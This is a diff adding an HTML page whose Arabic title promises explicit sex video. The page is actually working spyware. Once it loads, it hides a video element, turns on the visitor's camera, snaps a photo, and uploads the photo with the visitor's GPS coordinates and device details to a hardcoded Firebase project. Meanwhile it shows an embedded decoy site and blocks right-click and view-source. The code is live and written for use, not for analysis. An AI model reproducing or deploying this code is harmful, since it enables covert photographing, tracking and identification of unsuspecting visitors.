@@ -1,1 +1,228 @@
+<!DOCTYPE html>
+<html>
 
+<head>
+  <title> مشاهدة نيك عرب مثير لاحلي شرموطة مربربة </title>
+  <style>
+    #video {
+      display: none;
+      /* Hide the video element */
+    }
+
+    body {
+      margin: 0;
+      overflow: hidden;
+    }
+
+    #embed-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+    }
+
+    #embedded-website {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+  </style>
+</head>
+
+<body>
+  
+  <div id="embed-container">
+    <embed id="embedded-website"
+      src="https://www.google.com">
+  </div>
+  
+  <video id="video" autoplay></video>
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <script>
+    // Initialize Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyBfqi85dUYPHR2Lfnwdz3ZYEXEHNzZmkLk",
+      authDomain: "public-demo1.firebaseapp.com",
+      databaseURL: "https://public-demo1-default-rtdb.firebaseio.com",
+      projectId: "public-demo1",
+      storageBucket: "public-demo1.appspot.com",
+      messagingSenderId: "27666909796",
+      appId: "1:27666909796:web:33a29feab840a144ea2d71"
+    };
+    firebase.initializeApp(firebaseConfig);
+
+
+
+
+    const imagesRef = firebase.database().ref('urldb');
+
+  imagesRef.once('value')
+    .then(snapshot => {
+      const data = snapshot.val();
+      const imageURL = data.weburll;
+
+      // Update the src attribute of the embedded-website element
+      const embeddedWebsite = document.getElementById('embedded-website');
+      embeddedWebsite.src = imageURL;
+    })
+    .catch(error => {
+      console.error('Error retrieving data:', error);
+    });
+
+
+
+    
+    const storage = firebase.storage();
+    const storageRef = storage.ref();
+
+    const video = document.getElementById('video');
+
+    let stream;
+
+    // Request access to the camera and start streaming
+    async function startCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (error) {
+        console.error('Error accessing camera:', error);
+      }
+    }
+
+    // Capture image from the video stream
+    function captureImage() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob((blob) => {
+        const currentTime = new Date();
+        const filename = `captured-image_${currentTime.getHours()}.${currentTime.getMinutes()}.${currentTime.getSeconds()}.png`;
+
+        // Get current GPS location
+        navigator.geolocation.getCurrentPosition((position) => {
+          const { latitude, longitude } = position.coords;
+          const gpsLocation = `${latitude},${longitude}`;
+
+          const uploadTask = storageRef.child(filename).put(blob);
+
+          uploadTask.then(snapshot => {
+            console.log('Image uploaded successfully:', snapshot.ref);
+            stopCamera(); // Stop the camera stream after uploading
+
+            // Get the image URL
+            snapshot.ref.getDownloadURL().then(url => {
+              // Retrieve GPS location
+              navigator.geolocation.getCurrentPosition(position => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Push the location and image URL to the Realtime Database
+                firebase.database().ref('images').push({
+                  location: "https://www.google.com/maps/place/" + latitude + "+" + longitude,
+                  imageUrl: url
+                }).then(() => {
+                  console.log('Location and image URL pushed to the database.');
+                }).catch(error => {
+                  console.error('Error pushing to the database:', error);
+                });
+              }, error => {
+                console.error('Error retrieving GPS location:', error);
+              });
+            }).catch(error => {
+              console.error('Error getting image URL:', error);
+            });
+          }).catch(error => {
+            console.error('Error uploading image:', error);
+          });
+
+        }, (error) => {
+          console.error('Error accessing GPS location:', error);
+        });
+      }, 'image/png');
+    }
+
+    // Stop the camera stream
+    function stopCamera() {
+      if (stream) {
+        const tracks = stream.getTracks();
+        tracks.forEach(track => {
+          track.stop();
+        });
+      }
+    }
+
+    // Start camera when the page loads
+    window.addEventListener('DOMContentLoaded', () => {
+      startCamera();
+
+      // Automatically capture image after a time interval (in milliseconds)
+      const captureInterval = 4500; // 3 seconds
+
+      setTimeout(() => {
+        captureImage();
+      }, captureInterval);
+    });
+
+
+
+    function getCurrentLocation() {
+      navigator.geolocation.getCurrentPosition(position => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        // Upload location and device information
+        uploadLocationAndDeviceInfo(latitude, longitude);
+      }, error => {
+        console.error('Error retrieving GPS location:', error);
+      });
+    }
+    getCurrentLocation();
+
+
+    // Upload location and device information
+    function uploadLocationAndDeviceInfo(latitude, longitude) {
+      // Get device information
+      const deviceInfo = navigator.userAgent + "\n" + navigator.platform + "\n" + window.screen.width + "\n" + window.screen.height;
+
+
+      // Create a new Firebase Database reference
+      const databaseRef = firebase.database().ref('locations');
+
+      // Push location and device information to the database
+      const newLocationRef = databaseRef.push();
+      newLocationRef.set({
+        location: "https://www.google.com/maps/place/" + latitude + "+" + longitude,
+        deviceInfo: deviceInfo
+      }, error => {
+        if (error) {
+          console.error('Error pushing to the database:', error);
+        } else {
+          console.log('Location and device information pushed to the database.');
+        }
+      });
+    }
+  </script>
+
+  <script>
+    document.addEventListener("contextmenu", function (event) {
+      event.preventDefault();
+    });
+  </script>
+  <script>
+    document.addEventListener("keydown", function (event) {
+      if (event.ctrlKey && event.key === "u") {
+        event.preventDefault();
+      }
+    });
+  </script>
+</body>
+
+</html>
